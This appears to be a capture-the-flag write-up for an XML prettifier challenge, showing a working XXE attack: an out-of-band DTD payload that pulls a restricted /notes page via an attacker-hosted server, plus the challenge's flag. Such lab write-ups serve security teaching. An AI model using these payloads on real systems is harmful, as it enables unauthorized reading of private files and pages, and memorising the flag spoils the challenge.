#### Challenge:

Hi, packet inspector,

some former employe of Mysterious Delivery Ltd. has created prettifier for XML code. It is polite to provide information to the AI in nicely formatted XML, isn't it? Rumors say that the employee also left some crucial information somewhere on the web.

Find the crucial information on webpage [http://prettifier.mysterious-delivery.tcc:50000
](http://prettifier.mysterious-delivery.tcc:50000).

May the Packet be with you!

---

#### Solution:

- playing with the portal reveals that flag is hidden at `/notes` sub-page, but its access is restricted. However, the `xml` service seems to be vulnerable to `XXE` attacks as we can easily expose `/etc/passwd` file.
- trying to expose the actual `html` content doesn't work, as it doesn't satisfy the `xml` schema, thus we need to use something more sophisticated. Here comes into play the [XXE - DTD](https://phonexicum.github.io/infosec/xxe.html#dtd-attack-vectors) exploit, that allows us to dump the `/notes` contents with help of out local server


- prepare the `dtd` payload for local `http` server
`evil.dtd`
```xml
<!ENTITY % file SYSTEM "http://localhost:50000/notes">
<!ENTITY % start "<![CDATA[">
<!ENTITY % end "]]>">
<!ENTITY % all "<!ENTITY fileContents '%start;%file;%end;'>">
```

- serve the local files that will be used for exploit
```bash
python3 -m http.server --directory .
```

```xml
<!DOCTYPE data [
  <!ENTITY % dtd SYSTEM
  "http://10.200.0.53:8000/evil.dtd">
  %dtd;
  %all;
]>
<data>&fileContents;</data>
```

---

<details><summary>FLAG:</summary>

```
FLAG{GG53-5U3w-VT8F-qB31}
```

</details>
<br/>
